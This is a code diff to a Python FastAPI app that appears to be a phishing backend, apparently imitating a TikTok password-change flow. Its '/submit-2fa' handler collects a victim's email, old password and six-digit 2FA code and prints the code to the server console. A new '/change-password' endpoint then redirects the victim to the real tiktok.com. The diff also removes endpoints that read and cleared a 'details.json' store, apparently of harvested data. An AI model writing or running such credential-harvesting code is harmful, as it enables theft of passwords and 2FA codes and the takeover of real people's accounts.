@@ -49,40 +49,22 @@ async def login_code(request: Request):
 
 @app.post("/submit-2fa")
 async def login(
-    code1: int = Form(...),
-    code2: int = Form(...),
-    code3: int = Form(...),
-    code4: int = Form(...),
-    code5: int = Form(...),
-    code6: int = Form(...),
+    num1: int = Form(...),
+    num2: int = Form(...),
+    num3: int = Form(...),
+    num4: int = Form(...),
+    num5: int = Form(...),
+    num6: int = Form(...),
     email: str = Form(...),
-    old_password: str = Form(...)
+    old_password: str = Form(...),
 ):
-    code = f"{code1}{code2}{code3}{code4}{code5}{code6}"
-    return {"code": code, "email": email, "old_password": old_password}
+    code = f"{num1}{num2}{num3}{num4}{num5}{num6}"
+    print(f"Verification code for {email}: {code}")
+
+    with open("change-password.html", "r") as f:
+        return f.read()
 
 
-@app.get("/read")
-async def read_details(x_api_key: str = Header(...)):
-    if x_api_key != os.getenv("MY_API_KEY"):
-        raise HTTPException(
-            status_code=401,
-            detail=f"Unauthorized: Invalid API Key.",
-        )
-
-    with open("details.json", "r") as f:
-        return json.load(f)
-
-
-@app.get("/clear-json")
-async def read_details(x_api_key: str = Header(...)):
-    if x_api_key != os.getenv("MY_API_KEY"):
-        raise HTTPException(
-            status_code=401,
-            detail=f"Unauthorized: Invalid API Key.",
-        )
-
-    with open("details.json", "w") as f:
-        f.write("[]")
-
-    return {"status": 200}
+@app.post("/change-password")
+async def change_password():
+    return RedirectResponse(url="https://www.tiktok.com", status_code=303)
